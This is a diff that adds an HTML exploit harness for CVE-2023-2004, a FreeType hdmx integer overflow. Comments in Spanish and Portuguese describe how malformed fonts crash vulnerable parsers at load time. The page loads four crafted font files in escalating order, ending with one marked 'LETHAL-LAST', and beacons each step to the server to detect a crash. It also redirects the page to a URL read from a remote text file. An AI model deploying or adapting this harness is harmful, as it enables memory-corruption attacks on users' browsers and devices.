@@ -1,0 +1,41 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<script src="runtime-derive/derive-runtime.js"></script>
+<script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script>
+<title>FA-v39-hdmx — press-39: hdmx face-init puntal (CVE-2023-2004, fires en LOAD sin render)</title></head>
+<body><pre id="out">FA-v39-hdmx…<br><span id="rx" style="font-family:serif">A</span></pre>
+<script>
+(function(){
+"use strict";
+/* FA-v39-hdmx — press-39: FreeType parsea hdmx AL CREAR LA FUENTE (= load()).
+ * Activación de render NO IMPORTA — si FT viejo (<2.13) y el producto
+ * de numRecords×recordSize desborda su aritmética, muere EN EL LOAD.
+ * Filas vão de benignas a letales: f13 (overread clampeado) →
+ * f14a (size=0 ¿regla tamaño<2?) → f14c (borde int31) → f14b (puntal
+ * signed 0xFFFF×0xFFFF) = LETHAL-LAST. enter/res por fila; res ausente
+ * + TCP-RST = el puntal fireó al face-init. */
+var RID="v39h"+Date.now().toString(36).slice(-13);
+function bk(s,b){try{fetch("/beacon/"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("V39-HB","main-hb");},2000);
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+bk("V39-L","v39-hdmx; dr="+dr+"; rt="+rt);
+
+function Trnd(){ return Date.now().toString(36)+Math.floor(Math.random()*1e4).toString(36); }
+function doLoad(id, f){
+  bk("V39-E"+id, "enter-load "+id);
+  try{
+    var ff=new FontFace("f39-"+id, "url(/document/al/ps5/"+f+"?t="+Trnd()+")");
+    document.fonts.add(ff);
+    ff.load().then(function(){ bk("V39-R"+id, id+" load=OK (hdmx NO mató)"); },
+                    function(err){ bk("V39-R"+id, id+" rechaza: "+String((err&&err.name)+" "+(err&&err.message)||err).slice(0,55)); });
+  }catch(e){ bk("V39-R"+id, id+" E:"+String((e&&e.message)||e).slice(0,50)); }
+}
+setTimeout(function(){ doLoad("f13","f13.ttf"); }, 300);
+setTimeout(function(){ doLoad("f14a","f14a.ttf"); }, 1400);
+setTimeout(function(){ doLoad("f14c","f14c.ttf"); }, 2500);
+setTimeout(function(){ doLoad("f14b","f14b.ttf"); }, 3600);   /* LETHAL-LAST */
+setTimeout(function(){ clearInterval(HB); bk("V39-Z","FA-v39-hdmx complete"); }, 6500);
+setTimeout(function(){ clearInterval(HB); bk("V39-Z2","late-z(16s)"); }, 16000);
+})();
+</script></body></html>
